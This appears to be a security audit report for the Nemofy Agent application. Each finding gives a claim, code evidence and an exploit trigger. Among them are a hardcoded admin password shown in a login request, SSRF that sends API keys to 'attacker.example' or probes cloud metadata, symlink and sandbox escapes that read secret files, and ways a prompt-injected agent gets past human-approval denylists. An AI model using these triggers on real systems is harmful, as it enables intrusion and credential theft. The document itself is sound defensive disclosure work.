claim: Hardcoded default administrator password is seeded whenever NEMOFY_ADMIN_PASSWORD is unset, and its unsalted SHA-256 digest is embedded in the client bundle.
evidence: server/authStore.ts:21-22 defines DEFAULT_PASSWORD = process.env.NEMOFY_ADMIN_PASSWORD || 'Rahul1234$' and seeds admin in loadOrSeed() (lines 78-88) when data/auth.json does not exist. NEMOFY_ADMIN_PASSWORD is also omitted from .env.example. Nemofy Agent/src/lib/authValidation.ts:3-4 embeds DEFAULT_STANDALONE_CREDENTIAL_DIGEST for the same default credential.
runtimeTrigger: On any fresh deployment where NEMOFY_ADMIN_PASSWORD is not configured, an unauthenticated remote attacker sends POST /api/auth/login with {"username":"admin","password":"Rahul1234$"} and obtains full administrator session access to workspace files, encrypted vault operations, and Agent-Core execution.

claim: Unauthenticated POST /api/auth/logout clears all active provider API keys inside the running Agent-Core process.
evidence: server.ts:264-268 mounts app.post('/api/auth/logout', ...) without requireSession or isSameOriginMutation and unconditionally invokes callAgentCore('/config/secrets', { method: 'DELETE' }), which triggers Agent-Core/agent_core/api.py:455-460 to clear app.state.profile_secrets and pop every provider API key from os.environ.
runtimeTrigger: Any unauthenticated client or cross-site web page issues POST /api/auth/logout, immediately wiping all hydrated LLM API keys from Agent-Core and causing active/subsequent authenticated agent runs to fail with missing API key errors.

claim: Arbitrary base_url in /api/settings/models and /api/settings/probe enables SSRF and exfiltration of decrypted profile vault API keys to attacker-controlled hosts.
evidence: server.ts:1252-1300 passes caller-supplied base_url and decrypted profileSecrets into listProviderModelsDirect (server/providerCatalog.ts:288-311) and probeProviderModelDirect (lines 391-450). Only /^https?:\/\//i is checked; no private/loopback/metadata IP blocking or host allowlist is enforced, and resolveProviderApiKey (lines 80-103) attaches the decrypted server-side vault API key in Authorization/x-api-key headers to the arbitrary base_url.
runtimeTrigger: An authenticated caller (or XSS payload) sends POST /api/settings/models with {"provider":"openai","base_url":"https://attacker.example/v1"} (omitting api_key) to receive the decrypted OPENAI_API_KEY in the Authorization header on attacker.example, or sets base_url to http://169.254.169.254/latest/meta-data to probe internal/metadata endpoints.

claim: Workspace filesystem API resolves paths lexically without resolving symbolic links, allowing arbitrary host file read/write via symlinks inside /workspace.
evidence: server/configStore.ts:524-538 resolveWorkspacePath uses path.resolve(this.workspaceDir, clean) and never calls fs.realpathSync on existing targets or parent directories. readWorkspaceFile (lines 710-737), writeWorkspaceFile (lines 739-749), and listWorkspaceDirectory (lines 641-708) pass this lexical path directly to fs.statSync/readFileSync/writeFileSync/readdirSync, which follow symlinks out of /workspace.
runtimeTrigger: If a symbolic link inside workspace/ points outside workspace/ (for example created via bash_exec 'ln -s ../data/auth.json leak.json', which is allowed as SAFE by guardrails.py and not blocked by _LOCAL_ESCAPE_PATTERNS in sandbox.py), GET /api/filesystem/file?path=leak.json returns data/auth.json (including sessionSecret and vaultMasterSecret), and PUT /api/filesystem/file overwrites the symlink target.

claim: Stale threads array loaded before awaiting long-running Agent-Core execution overwrites data/threads.json on completion, silently dropping concurrent threads and messages.
evidence: In POST /api/chat/send (server.ts:462), threads is read from disk before awaiting callAgentCore('/agent/run') (line 512, up to 120s timeout), then the same stale threads array is written back at lines 558 and 596 via store.saveThreads(threads). POST /api/chat/jobs/start has the same pattern between line 677 and error write at line 774.
runtimeTrigger: Start a request via POST /api/chat/send on thread A; while Agent-Core is executing, create thread B (POST /api/threads) or add a message in thread C; when thread A finishes, store.saveThreads(threads) overwrites data/threads.json with the pre-run snapshot, deleting thread B and thread C's new messages.

claim: parseCookieHeader calls decodeURIComponent without error handling, causing uncaught URIError 500 failures on any request with a malformed percent-encoded cookie.
evidence: server/authStore.ts:201 executes decodeURIComponent(part.slice(idx + 1).trim()) with no try/catch for every cookie in the Cookie header. extractSessionToken (server.ts:96) calls parseCookieHeader on /api/auth/me and every requireSession route.
runtimeTrigger: Send GET /api/auth/me with header 'Cookie: any=%E0%A4%A'; decodeURIComponent throws URIError: URI malformed, returning HTTP 500 instead of treating the cookie as invalid or unauthenticated.

claim: Stateless session tokens are never invalidated on logout, remaining valid for their full 24-hour TTL after the user signs out.
evidence: AuthStore.createSessionToken signs {username, issuedAt, expiresAt, version: updatedAt} with sessionSecret, and verifySessionToken checks only signature, expiry, and updatedAt. server.ts:264-268 POST /api/auth/logout only clears the browser cookie and never rotates sessionSecret or records a revoked token/generation.
runtimeTrigger: Sign in to obtain a session token (Bearer or nemofy_session cookie), call POST /api/auth/logout, and replay the same token on GET /api/threads or GET /api/filesystem/tree; the request still succeeds with HTTP 200 for up to 24 hours.

claim: Chat send and job-start endpoints persist the user message and newly created thread to disk before validating that a Primary model is configured.
evidence: In POST /api/chat/send (server.ts:480-497) and POST /api/chat/jobs/start (server.ts:695-712), userMsg is pushed onto thread.messages and persisted via store.saveThreads(threads) before checking if (!llmCfg.primary.model.trim()), which then aborts with HTTP 400.
runtimeTrigger: Clear the Primary model in Settings, then submit a chat message via POST /api/chat/jobs/start; the server responds with HTTP 400 error, yet reloads show the rejected user message permanently saved (and duplicated on each retry) in data/threads.json.

claim: FastAPI CORSMiddleware defaults to allow_origins=['*'] with allow_credentials=True, reflecting any untrusted Origin header on all endpoints including unauthenticated /health.
evidence: Agent-Core/agent_core/api.py:316-327 defaults CORS_ALLOW_ORIGINS to '*' while setting allow_credentials=True. In Starlette CORSMiddleware, wildcard origin combined with allow_credentials=True reflects the request Origin header with Access-Control-Allow-Credentials: true. GET /health (lines 384-420) has no authentication and returns host workspace_dir, checkpoint.path, config_path, and MCP tool names.
runtimeTrigger: Any malicious website visited by a developer running Nemofy Agent locally executes fetch('http://127.0.0.1:8100/health', {credentials:'include'}) and reads the JSON response containing local filesystem paths, configured models, and MCP server metadata.

claim: find_safe_compaction_split orphans trailing ToolMessages when a turn ends with multiple parallel tool results, producing an invalid message history that LLM providers reject.
evidence: In Agent-Core/agent_core/context_manager.py:583-584, the loop advances candidate while candidate < n - 1 and isinstance(messages[candidate], ToolMessage), stopping at candidate = n - 1 when messages[n - 1] is a ToolMessage. Lines 588-593 then check only whether messages[candidate - 1] is an AIMessage; when an AIMessage invoked >= 2 tools in parallel, messages[candidate - 1] is another ToolMessage, so candidate stays at n - 1 and is returned at line 597. compact_conversation_history (lines 686-691) therefore compacts the AIMessage and earlier ToolMessages while leaving messages[n - 1] as an orphaned ToolMessage.
runtimeTrigger: During a single-turn or multi-tool run where context usage hits >= 80% after an AIMessage with 2+ parallel tool_calls (e.g., [HumanMessage, AIMessage(tc1, tc2), ToolMessage(tc1), ToolMessage(tc2)]), find_safe_compaction_split computes candidate=2, advances to 3, skips the line 588 check because messages[2] is a ToolMessage, and returns 3. The next LLM call sends [ToolMessage(tc2)] without its preceding AIMessage(tool_calls), failing with provider HTTP 400 invalid tool message sequence.

claim: list_provider_models and probe_model_connectivity perform SSRF-prone HTTP requests with follow_redirects=True to arbitrary base_url values while attaching server-side provider API keys.
evidence: Agent-Core/agent_core/models.py:1233-1266 accepts an arbitrary base_url (checking only startswith(('http://','https://')) in list_provider_models and omitting scheme checks in probe_model_connectivity at line 1339), resolves server-side API keys from os.environ via _resolve_api_key when api_key is omitted, attaches them via _build_provider_headers, and opens httpx.AsyncClient(follow_redirects=True) without blocking private/loopback/metadata IP ranges or restricting hostnames.
runtimeTrigger: Calling Agent-Core POST /config/models or POST /config/probe (or via Express /api/settings/models and /api/settings/probe) with a known provider name (e.g., openai), an omitted api_key, and a custom base_url pointing to an external collector or internal/metadata service causes Agent-Core to transmit the configured server-side API key to that host or probe internal network services.

claim: act_node executes multiple tool calls sequentially in a loop without idempotency or per-call checkpointing, causing earlier tools (including previously approved sensitive actions) to re-execute when a later tool triggers LangGraph interrupt().
evidence: In Agent-Core/agent_core/graph.py:2129-2299, act_node iterates over all tool_calls in the latest AIMessage and awaits execute_tool_with_guardrails(...) (line 2186), which calls langgraph.types.interrupt(payload) in Agent-Core/agent_core/guardrails.py:367 for SENSITIVE tools. When GraphInterrupt is raised (re-raised at line 2192), LangGraph discards the in-flight node state and, upon Command(resume=...), replays act_node from line 2110. Every tool_call preceding the interrupted call is invoked a second time via tool_obj.ainvoke(validated_args) because none of the side-effecting calls are wrapped in a LangGraph task or tracked across interrupt replay.
runtimeTrigger: The LLM emits two tool calls in one turn: either [edit_file('app.py', 'old', 'new'), bash_exec('rm -f temp.log')] or two SENSITIVE calls [send_email(...), bash_exec('rm -f temp.log')]. On first execution, call 0 runs its side effect (mutating app.py or interrupting and then sending the email on resume 1), and call 1 triggers GraphInterrupt. When the human approves call 1, LangGraph replays act_node from the top, re-executing call 0 (failing edit_file because 'old' was already replaced, duplicating bash_exec side effects, or sending the approved email twice).

claim: bash_exec HITL guardrail relies on a narrow regex denylist and defaults unmatched shell commands to SAFE, allowing destructive file deletion and outbound HTTP mutations without human approval.
evidence: Agent-Core/agent_core/guardrails.py:132-147 checks bash_exec commands against only 10 regexes in DESTRUCTIVE_BASH_PATTERNS (lines 44-79) and returns safety_level='SAFE' for any non-matching command. Commands such as python3 -c file/directory removal or HTTP POST, find -delete, file truncation via redirection (> file), symlink creation (ln -s), curl -F/--form or -T uploads, or quoted/subshell forms bypass every regex and run automatically without invoking request_human_approval.
runtimeTrigger: A prompt-injected or erroneous agent call invokes bash_exec with a destructive or outbound-mutating command that omits the denylisted tokens (for example using python3 -c, find -delete, or curl -T/-F); classify_tool_call returns SAFE and execute_tool_with_guardrails executes the command immediately without triggering HITL approval.

claim: web_fetch SSRF protection can be bypassed via DNS-resolved private/loopback hostnames or HTTP redirects because _validate_web_url never resolves DNS and fetch_webpage_markdown follows redirects without re-validating targets.
evidence: Agent-Core/agent_core/tools/local.py:58-81 _validate_web_url only rejects literal strings in ('localhost','127.0.0.1','::1','0.0.0.0') or literal private/loopback/link-local IP addresses (silently passing any hostname via except ValueError: pass at lines 78-79). Lines 99-106 then execute httpx.AsyncClient(follow_redirects=True, max_redirects=5).get(validated_url) without re-running _validate_web_url on redirect Location hops or pinning resolved IPs. Because web_fetch is in EXPLICIT_SAFE_TOOLS (guardrails.py:26), it executes without human approval.
runtimeTrigger: A prompt-injected webpage or user task instructs the agent to call web_fetch on either (1) a hostname resolving to a loopback/link-local IP (such as a DNS alias for 127.0.0.1 or 169.254.169.254, or an internal service hostname) or (2) a public URL that responds with HTTP 302 Location: http://127.0.0.1:8100/health or http://169.254.169.254/latest/meta-data/. _validate_web_url passes and httpx fetches and returns the internal response body to the agent.

claim: local_isolated sandbox mode executes bash_exec directly on the host OS using only a 4-regex denylist, allowing trivial sandbox escape to read or overwrite host secrets (auth.json, encrypted vaults, .env) and application code.
evidence: When Docker is unavailable (the default SANDBOX_BACKEND=auto fallback), Agent-Core/agent_core/sandbox.py:471-516 _exec_local_isolated checks only the 4 static patterns in _LOCAL_ESCAPE_PATTERNS (lines 44-49: docker.sock, /etc/shadow|passwd|sudoers, /proc/<pid>/environ|mem|root, literal .env) and then spawns bash -c directly on the host filesystem with cwd=workspace_dir and no filesystem namespace, chroot, or mount isolation. Paths such as ../data/auth.json (which stores sessionSecret and vaultMasterSecret), ../data/vaults/*.vault.json, ../data/llm_config.json, and obfuscated reads of ../.env are unrestricted.
runtimeTrigger: On any deployment running in local_isolated mode, an agent tool call to bash_exec (classified SAFE by guardrails.py) reads ../data/auth.json or ../data/vaults/admin.vault.json via standard shell or Python file I/O (or modifies ../server.ts), completely bypassing workspace confinement and exposing the vault master secret and session signing secret.

claim: MCPServerConfig and load_mcp_tools_from_configs connect to caller-supplied MCP server URLs without URL scheme validation or private/metadata network restrictions (SSRF).
evidence: MCPs/manager.py:28-33 defines MCPServerConfig.url as an unvalidated string, and lines 79-97 pass srv.url and arbitrary headers directly to MultiServerMCPClient for streamable_http/sse connections without verifying http(s) scheme or blocking loopback, private RFC1918, or cloud metadata (169.254.169.254) addresses. Agent-Core/agent_core/api.py:575-588 and 745 accept per-request mcp_servers straight into load_mcp_tools_from_configs.
runtimeTrigger: An authenticated caller configures an MCP server via PUT /api/mcps or passes per-request mcp_servers to Agent-Core with url pointing to an internal host or cloud metadata service; Agent-Core initiates outbound HTTP/SSE requests to that internal target and returns connection diagnostics in warnings.

claim: Isolated sub-agent graphs are compiled without a checkpointer while still propagating LangGraph GraphInterrupt, causing HITL approval resume to restart the sub-agent from scratch instead of resuming at the paused tool call.
evidence: Agent-Core/agent_core/subagents.py:473 compiles worker_graph = builder.compile() with no checkpointer. Inside worker_act (lines 428-435), execute_tool_with_guardrails calls langgraph.types.interrupt() for SENSITIVE tools and re-raises GraphInterrupt (lines 434, 507) out of spawn_subagent into the parent act_node. When the parent graph resumes with Command(resume=...), LangGraph re-invokes spawn_subagent -> run_isolated_subagent from initial_worker_state (turn_count=0), re-running all earlier worker LLM calls and side-effecting worker tools and risking non-deterministic divergence before reaching the interrupt.
runtimeTrigger: The supervisor delegates a multi-step task via spawn_subagent; on turn 2 the worker calls a SENSITIVE tool (e.g., bash_exec with rm or an external MCP mutation), pausing the graph for HITL approval. After the user approves, the parent resumes act_node, which restarts worker_graph from turn 0, re-executing turn 1's LLM call and tool calls rather than resuming turn 2.

claim: Creating a new workspace file silently truncates and overwrites any existing file at the same path to 0 bytes because neither FilesystemView nor the workspace file save endpoint checks whether the target file already exists.
evidence: Nemofy Agent/src/components/FilesystemView.tsx:162-166 implements the 'New file' creation flow by calling saveWorkspaceFile(clean, '') directly without checking whether clean already exists in tree or passing a create-only flag. On the backend, PUT /api/filesystem/file calls writeWorkspaceFile in server/configStore.ts, which writes content directly via fs.writeFileSync without O_EXCL / exclusive creation semantics. After truncating an existing file, line 164 shows 'Created file /workspace/<clean>'.
runtimeTrigger: A user opens the Workspace Filesystem view, clicks 'New file', and enters the relative path of an existing file (such as notes.md or src/app.py). handleCreateSubmit calls saveWorkspaceFile(clean, ''), silently wiping the existing file's contents to an empty string with no confirmation or conflict error.

claim: Skill deletion and MCP server mutation handlers omit try/catch error handling, and skill deletion reports success even when the DELETE /api/skills/:name request fails.
evidence: Nemofy Agent/src/components/SettingsView.tsx:880-922 implements handleDeleteSkill, handleAddMcpServer, handleToggleMcp, and handleDeleteMcp without try/catch (unlike handleSaveSkill at lines 864-878). When saveMCPServers throws on a non-OK response (Nemofy Agent/src/lib/apiClient.ts:915), the promise rejects unhandled and the UI displays no error feedback. In handleDeleteSkill (lines 880-890), deleteSkillDocument (apiClient.ts:886-895) ignores !res.ok on DELETE /api/skills/:name, so a server-side failure still reaches line 889 and displays 'Deleted skill "<name>"'.
runtimeTrigger: An authenticated user attempts to delete a skill or add/toggle/delete an MCP server while the backend returns 400/401/500 or encounters a network error. MCP actions trigger unhandled promise rejections with silent UI failure, and failed skill deletion falsely displays a 'Deleted skill' confirmation banner.

claim: Markdown link matching permits protocol-relative external URLs starting with '//', which bypasses MarkdownMessage's external-link check and renders links to external origins without target="_blank" or rel="noopener noreferrer".
evidence: Nemofy Agent/src/lib/markdownRenderer.ts:289-290 defines INLINE_PATTERN with the link URL prefix `(?:https?:\/\/|\/)[^)\s]+`. Because `\/` matches `//`, a markdown link `[docs](//external.example/page)` is parsed into a link token with href `//external.example/page`. Nemofy Agent/src/components/MarkdownMessage.tsx:81-83 only checks `tok.href.startsWith('http')` to apply `target="_blank"` and `rel="noopener noreferrer"`, so protocol-relative external links navigate the authenticated app tab off-origin without opener isolation.
runtimeTrigger: An agent response (for example, summarizing untrusted fetched web content) includes a markdown link using a protocol-relative URL `[label](//external.example/phish)`. Clicking the link navigates the top-level Nemofy Agent window directly to the external origin instead of opening an isolated tab.
